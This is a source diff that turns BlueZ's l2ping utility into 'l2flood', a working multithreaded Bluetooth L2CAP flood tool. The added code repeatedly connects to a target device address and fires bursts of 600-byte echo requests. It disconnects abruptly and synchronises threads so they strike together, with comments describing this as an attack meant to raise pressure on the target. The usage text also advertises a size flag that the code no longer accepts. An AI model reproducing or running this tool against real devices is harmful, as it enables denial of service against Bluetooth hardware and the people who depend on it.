@@ -1,335 +1,203 @@
-// SPDX-License-Identifier: GPL-3.0-or-later
-/*
- *
- *  BlueZ - Bluetooth protocol stack for Linux
- *
- *  Copyright (C) 2000-2001  Qualcomm Incorporated
- *  Copyright (C) 2002-2003  Maxim Krasnyansky <maxk@qualcomm.com>
- *  Copyright (C) 2002-2010  Marcel Holtmann <marcel@holtmann.org>
- *
- *
- */
+/* SPDX-License-Identifier: GPL-3.0-or-later
+ * Copyright (c) 2026 Ivan Kovmir */
 
-#ifdef HAVE_CONFIG_H
-#include <config.h>
-#endif
-
-#define _GNU_SOURCE
-#include <stdio.h>
+/* Includes */
+#include <assert.h>
 #include <errno.h>
-#include <unistd.h>
+#include <err.h>
+#include <fcntl.h>
+#include <getopt.h>
+#include <poll.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <getopt.h>
-#include <signal.h>
-#include <sys/time.h>
-#include <poll.h>
 #include <sys/socket.h>
+#include <sys/time.h>
+#include <unistd.h>
+
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/hci.h>
+#include <bluetooth/hci_lib.h>
+#include <bluetooth/l2cap.h>
 
 #ifdef _OPENMP
 #include <omp.h>
+#else
+#error "OpenMP support missing."
 #endif /* _OPENMP */
 
-#include "bluetooth/bluetooth.h"
-#include "bluetooth/hci.h"
-#include "bluetooth/hci_lib.h"
-#include "bluetooth/l2cap.h"
+/* Constants and Macros */
+#ifndef __linux__
+#warning "Unsupported operating system."
+#endif /* __linux__ */
 
-/* Defaults */
-static bdaddr_t bdaddr;
-static int size    = 44;
-static int ident   = 200;
-static int delay   = 1;
-static int count   = -1;
-static int timeout = 10;
-static int reverse = 0;
-static int verify = 0;
-#ifdef _OPENMP
-static int threads;
-#endif /* _OPENMP */
+#define SEND_BUF_SIZE 600
+#define BURST_LEN 50
+#define THREAD_SYNC_DELAY_US 5000
+#define CONNECTION_FAILED_DELAY_US 5000
 
-/* Stats */
-static int sent_pkt = 0;
-static int recv_pkt = 0;
+#define CLOSE_SOCKET(socket_fd) do { \
+    if ((socket_fd) != -1) { \
+        close(socket_fd); \
+        socket_fd = -1; \
+    } \
+} while (0)
 
-static float tv2fl(struct timeval tv)
+/* Function prototypes */
+static void flood_ping(char *svr);
+static inline void usage(void);
+
+/* Global variables */
+static bdaddr_t local_baddr; /* Local Bluetooth interface to attack from. */
+static int num_threads;      /* Number of parallel workers. */
+
+void
+flood_ping(char *target_baddr)
 {
-	return (float)(tv.tv_sec*1000.0) + (float)(tv.tv_usec/1000.0);
-}
-
-static void stat(int sig)
-{
-	int loss = sent_pkt ? (float)((sent_pkt-recv_pkt)/(sent_pkt/100.0)) : 0;
-	printf("%d sent, %d received, %d%% loss\n", sent_pkt, recv_pkt, loss);
-	exit(0);
-}
-
-static void ping(char *svr)
-{
-	struct sigaction sa;
 	struct sockaddr_l2 addr;
 	socklen_t optlen;
-	unsigned char *send_buf;
-	unsigned char *recv_buf;
+	int i, socket_fd;
+	char send_buf[L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE];
 	char str[18];
-	int i, sk, lost;
-	uint8_t id;
+	int fd_opts;
 
-	memset(&sa, 0, sizeof(sa));
-	sa.sa_handler = stat;
-	sigaction(SIGINT, &sa, NULL);
-
-	send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
-	recv_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
-	if (!send_buf || !recv_buf) {
-		perror("Can't allocate buffer");
-		exit(1);
-	}
-
-	/* Create socket */
-	sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
-	if (sk < 0) {
-		perror("Can't create socket");
-		goto error;
-	}
-
-	/* Bind to local address */
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	bacpy(&addr.l2_bdaddr, &bdaddr);
-
-	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
-		perror("Can't bind socket");
-		goto error;
-	}
-
-	/* Connect to remote device */
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	str2ba(svr, &addr.l2_bdaddr);
-
-	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
-		perror("Can't connect");
-		goto error;
-	}
-
-	/* Get local address */
-	memset(&addr, 0, sizeof(addr));
-	optlen = sizeof(addr);
-
-	if (getsockname(sk, (struct sockaddr *) &addr, &optlen) < 0) {
-		perror("Can't get local address");
-		goto error;
-	}
-
-	ba2str(&addr.l2_bdaddr, str);
-	printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);
+	/* Socket options. */
+	struct linger linger_opt = {1, 0};
+	struct timeval snd_tv = {0, 300000}; /* 300ms */
+	int reuse = 1;
+	int sock_err;
+	socklen_t sock_err_len;
 
 	/* Initialize send buffer */
-	for (i = 0; i < size; i++)
+	for (i = 0; i < SEND_BUF_SIZE; i++)
 		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';
 
-	id = ident;
+	for (;;) {
+		/* Create non-blocking socket so we can control connection
+		 * attempt timeout; see below. */
+		socket_fd = socket(PF_BLUETOOTH, SOCK_RAW|SOCK_NONBLOCK, BTPROTO_L2CAP);
+		if (socket_fd < 0)
+			errx(1, "Can't create socket");
 
-	while (count == -1 || count-- > 0) {
-		struct timeval tv_send, tv_recv, tv_diff;
-		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
-		l2cap_cmd_hdr *recv_cmd = (l2cap_cmd_hdr *) recv_buf;
+		/* close() calls send RST immediately instead of graceful detach. */
+		setsockopt(socket_fd, SOL_SOCKET,
+				SO_LINGER, &linger_opt, sizeof(linger_opt));
+		/* Don't care if Bluetooth is still processing requests. */
+		setsockopt(socket_fd, SOL_SOCKET,
+				SO_REUSEADDR, &reuse, sizeof(reuse));
 
-		/* Build command header */
-		send_cmd->ident = id;
-		send_cmd->len   = htobs(size);
+		/* Bind to local address */
+		memset(&addr, 0, sizeof(addr));
+		addr.l2_family = AF_BLUETOOTH;
+		bacpy(&addr.l2_bdaddr, &local_baddr);
+		if (bind(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+			errx(1, "Can't bind socket");
 
-		if (reverse)
-			send_cmd->code = L2CAP_ECHO_RSP;
-		else
-			send_cmd->code = L2CAP_ECHO_REQ;
+		/* Connect to remote device */
+		memset(&addr, 0, sizeof(addr));
+		addr.l2_family = AF_BLUETOOTH;
+		str2ba(target_baddr, &addr.l2_bdaddr);
+		/* Rather than send a request and kindly wait for it
+		 * to be served, we repeat the request if it
+		 * has not been served quickly. This increases pressure. */
+		errno = 0;
+		/* Attempt the connection and discard the return value;
+		 * rely on errno instead. */
+		connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr));
+		if (errno != EINPROGRESS)
+			goto connection_failed;
 
-		gettimeofday(&tv_send, NULL);
+		/* Await connection for 1.5 seconds... */
+		struct pollfd cpf = {socket_fd, POLLOUT, 0};
+		if (poll(&cpf, 1, 1500) < 1)
+			goto connection_failed;
 
-		/* Send Echo Command */
-		if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0) {
-			perror("Send failed");
-			goto error;
+		/* Any errors? */
+		sock_err = 0;
+		sock_err_len = sizeof(sock_err);
+		getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len);
+		if (sock_err != 0)
+			goto connection_failed;
+
+		/* Connected; switch back to blocking sends. */
+		fd_opts = fcntl(socket_fd, F_GETFL, 0);
+		if (fd_opts == -1)
+			errx(1, "Can't request socket properties.");
+
+		fcntl(socket_fd, F_SETFL, fd_opts & ~O_NONBLOCK);
+		/* Set timeout on send() calls. */
+		setsockopt(socket_fd, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));
+
+		/* Get BT address of the local interface. */
+		memset(&addr, 0, sizeof(addr));
+		optlen = sizeof(addr);
+		if (getsockname(socket_fd, (struct sockaddr *) &addr, &optlen) < 0)
+			errx(1, "Can't get local address");
+		ba2str(&addr.l2_bdaddr, str);
+
+		printf("Thread %2d attacks %s from %s (data size %d) ...\n",
+		       omp_get_thread_num(), target_baddr, str, SEND_BUF_SIZE);
+
+		/* Send a lot of garbage. */
+		for (i = 0; i < BURST_LEN; i++) {
+			l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
+			send_cmd->ident = (uint8_t)rand();
+			send_cmd->len   = htobs(SEND_BUF_SIZE);
+			send_cmd->code  = L2CAP_ECHO_REQ;
+
+			if (send(socket_fd, send_buf, L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE, 0) < 1)
+				break; /* Whatever... Try again later. */
 		}
 
-		/* Wait for Echo Response */
-		lost = 0;
-		while (1) {
-			struct pollfd pf[1];
-			int err;
+		/* Abrupt disconnect. */
+		CLOSE_SOCKET(socket_fd);
+		/* Sync threads so they attack ~simultaneously. */
+		usleep(THREAD_SYNC_DELAY_US);
+		continue;
 
-			pf[0].fd = sk;
-			pf[0].events = POLLIN;
-
-			if ((err = poll(pf, 1, timeout * 1000)) < 0) {
-				perror("Poll failed");
-				goto error;
-			}
-
-			if (!err) {
-				lost = 1;
-				break;
-			}
-
-			if ((err = recv(sk, recv_buf, L2CAP_CMD_HDR_SIZE + size, 0)) < 0) {
-				perror("Recv failed");
-				goto error;
-			}
-
-			if (!err){
-				printf("Disconnected\n");
-				goto error;
-			}
-
-			recv_cmd->len = btohs(recv_cmd->len);
-
-			/* Check for our id */
-			if (recv_cmd->ident != id)
-				continue;
-
-			/* Check type */
-			if (!reverse && recv_cmd->code == L2CAP_ECHO_RSP)
-				break;
-
-			if (recv_cmd->code == L2CAP_COMMAND_REJ) {
-				printf("Peer doesn't support Echo packets\n");
-				goto error;
-			}
-
-		}
-		sent_pkt++;
-
-		if (!lost) {
-			recv_pkt++;
-
-			gettimeofday(&tv_recv, NULL);
-			timersub(&tv_recv, &tv_send, &tv_diff);
-
-			if (verify) {
-				/* Check payload length */
-				if (recv_cmd->len != size) {
-					fprintf(stderr, "Received %d bytes, expected %d\n",
-						   recv_cmd->len, size);
-					goto error;
-				}
-
-				/* Check payload */
-				if (memcmp(&send_buf[L2CAP_CMD_HDR_SIZE],
-						   &recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
-					fprintf(stderr, "Response payload different.\n");
-					goto error;
-				}
-			}
-
-#ifdef _OPENMP
-			printf("%d bytes from %s id %d time %.2fms thread %d\n", recv_cmd->len, svr,
-				   id - ident, tv2fl(tv_diff), omp_get_thread_num());
-#else
-			printf("%d bytes from %s id %d time %.2fms\n", recv_cmd->len, svr,
-				   id - ident, tv2fl(tv_diff));
-#endif /* _OPENMP */
-
-			if (delay)
-				sleep(delay);
-		} else {
-			printf("no response from %s: id %d\n", svr, id - ident);
-		}
-
-		if (++id > 254)
-			id = ident;
+connection_failed:
+		/* Clean-up. */
+		CLOSE_SOCKET(socket_fd);
+		/* Prevent the CPU from burning
+		 * when the target is unreachable. */
+		usleep(CONNECTION_FAILED_DELAY_US);
+		continue;
 	}
-	stat(0);
-	free(send_buf);
-	free(recv_buf);
-	return;
-
-error:
-	close(sk);
-	free(send_buf);
-	free(recv_buf);
-	exit(1);
 }
 
-static void usage(void)
+inline void
+usage(void)
 {
-#ifdef _OPENMP
-	printf("l2flood - L2CAP flood\n");
-#else
-	printf("l2ping - L2CAP ping\n");
-#endif /* _OPENMP */
 	printf("Usage:\n");
-#ifdef _OPENMP
-	printf("\tl2flood [-i device] [-s size] [-c count] [-t timeout] [-d delay] [-n threads] [-f] [-r] [-v] <bdaddr>\n");
-	printf("\t-f  Flood ping (delay = 0); default\n");
-#else
-	printf("\tl2ping [-i device] [-s size] [-c count] [-t timeout] [-d delay] [-f] [-r] [-v] <bdaddr>\n");
-	printf("\t-f  Flood ping (delay = 0)\n");
-#endif /* _OPENMP */
-	printf("\t-r  Reverse ping\n");
-	printf("\t-v  Verify request and response payload\n");
+	printf("\tl2flood [-i device] [-s size] <bdaddr>\n");
 }
 
-int main(int argc, char *argv[])
+int
+main(int argc, char *argv[])
 {
 	int opt;
 
-	/* Default options */
-	bacpy(&bdaddr, BDADDR_ANY);
+	/* Bind to any local Bluetooth interface by default. */
+	bacpy(&local_baddr, BDADDR_ANY);
+	/* A high number of workers is usually pointless,
+	 * as is having more workers than CPUs. */
+	num_threads = sysconf(_SC_NPROCESSORS_ONLN);
+	if (num_threads > 4)
+		num_threads = 4;
 
-#ifdef _OPENMP
-	size  = 600;
-	delay = 0;
-
-	threads = sysconf(_SC_NPROCESSORS_ONLN);
-	while ((opt=getopt(argc,argv,"i:d:s:c:t:n:frv")) != EOF) {
-#else
-	while ((opt=getopt(argc,argv,"i:d:s:c:t:frv")) != EOF) {
-#endif /* _OPENMP */
+	while ((opt = getopt(argc,argv,"i:t:")) != EOF) {
 		switch(opt) {
+		/* Bluetooth interface. */
 		case 'i':
 			if (!strncasecmp(optarg, "hci", 3))
-				hci_devba(atoi(optarg + 3), &bdaddr);
+				hci_devba(atoi(optarg + 3), &local_baddr);
 			else
-				str2ba(optarg, &bdaddr);
+				str2ba(optarg, &local_baddr);
 			break;
-
-		case 'd':
-			delay = atoi(optarg);
-			break;
-
-		case 'f':
-			/* Kinda flood ping */
-			delay = 0;
-			break;
-
-		case 'r':
-			/* Use responses instead of requests */
-			reverse = 1;
-			break;
-
-		case 'v':
-			verify = 1;
-			break;
-
-		case 'c':
-			count = atoi(optarg);
-			break;
-
+		/* Number of parallel workers. */
 		case 't':
-			timeout = atoi(optarg);
+			num_threads = atoi(optarg);
 			break;
-
-		case 's':
-			size = atoi(optarg);
-			break;
-
-#ifdef _OPENMP
-		case 'n':
-			threads = atoi(optarg);
-			break;
-#endif /* _OPENMP */
-
 		default:
 			usage();
 			exit(1);
@@ -337,13 +205,13 @@ int main(int argc, char *argv[])
 	}
 
 	if (!(argc - optind)) {
-		usage();
+		usage(); /* No target given. */
 		exit(1);
 	}
 
-#pragma omp parallel num_threads(threads)
+#pragma omp parallel num_threads(num_threads)
 	{
-		ping(argv[optind]);
+		flood_ping(argv[optind]);
 	}
 
 	return 0;
